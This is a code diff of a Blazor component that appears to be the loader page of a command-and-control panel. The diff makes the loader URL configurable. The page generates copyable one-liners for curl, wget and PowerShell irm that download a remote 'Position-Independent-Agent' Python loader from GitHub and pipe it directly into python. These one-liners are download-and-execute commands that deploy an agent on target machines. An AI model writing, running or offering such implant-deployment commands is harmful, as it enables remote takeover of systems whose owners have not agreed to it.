@@ -26,28 +26,33 @@
         </div>
 
         <div class="loader-section">
+            <h4 class="loader-section-title">Loader URL</h4>
+            <C2Input Value="@_loaderUrl" ValueChanged="OnLoaderUrlChanged" Placeholder="https://raw.githubusercontent.com/.../loader.py" />
+        </div>
+
+        <div class="loader-section">
             <h4 class="loader-section-title">One-Liners</h4>
 
             <span class="loader-command-label">All Platforms including Android/Termux (curl)</span>
             <div class="loader-command">
-                <code class="loader-code">curl https://raw.githubusercontent.com/mrzaxaryan/Position-Independent-Agent/main/tools/pyloader/load.py | python</code>
-                <button class="loader-copy-btn" @onclick='() => Copy("curl https://raw.githubusercontent.com/mrzaxaryan/Position-Independent-Agent/main/tools/pyloader/load.py | python")' title="Copy">
+                <code class="loader-code">curl @_loaderUrl | python</code>
+                <button class="loader-copy-btn" @onclick='() => Copy($"curl {_loaderUrl} | python")' title="Copy">
                     <C2Icon Name="copy" Size="Size.Xs" />
                 </button>
             </div>
 
             <span class="loader-command-label">Linux / macOS (wget)</span>
             <div class="loader-command">
-                <code class="loader-code">wget -qO- https://raw.githubusercontent.com/mrzaxaryan/Position-Independent-Agent/main/tools/pyloader/load.py | python</code>
-                <button class="loader-copy-btn" @onclick='() => Copy("wget -qO- https://raw.githubusercontent.com/mrzaxaryan/Position-Independent-Agent/main/tools/pyloader/load.py | python")' title="Copy">
+                <code class="loader-code">wget -qO- @_loaderUrl | python</code>
+                <button class="loader-copy-btn" @onclick='() => Copy($"wget -qO- {_loaderUrl} | python")' title="Copy">
                     <C2Icon Name="copy" Size="Size.Xs" />
                 </button>
             </div>
 
             <span class="loader-command-label">Windows (PowerShell)</span>
             <div class="loader-command">
-                <code class="loader-code">irm https://raw.githubusercontent.com/mrzaxaryan/Position-Independent-Agent/main/tools/pyloader/load.py | python</code>
-                <button class="loader-copy-btn" @onclick='() => Copy("irm https://raw.githubusercontent.com/mrzaxaryan/Position-Independent-Agent/main/tools/pyloader/load.py | python")' title="Copy">
+                <code class="loader-code">irm @_loaderUrl | python</code>
+                <button class="loader-copy-btn" @onclick='() => Copy($"irm {_loaderUrl} | python")' title="Copy">
                     <C2Icon Name="copy" Size="Size.Xs" />
                 </button>
             </div>
@@ -66,7 +71,12 @@
 </div>
 
 @code {
+    private const string DefaultLoaderUrl = "https://raw.githubusercontent.com/mrzaxaryan/Position-Independent-Agent/main/tools/pyloader/loader.py";
     private const string RepoUrl = "https://github.com/mrzaxaryan/Position-Independent-Agent/tree/main/tools/pyloader";
+
+    private string _loaderUrl = DefaultLoaderUrl;
+
+    private void OnLoaderUrlChanged(string value) => _loaderUrl = value;
 
     private void OpenRepo() => _ = JS.InvokeVoidAsync("open", RepoUrl, "_blank");
 
